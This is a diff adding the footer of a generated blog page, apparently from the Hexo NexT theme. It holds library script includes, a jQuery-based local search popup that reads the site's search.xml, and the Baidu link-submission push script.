+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
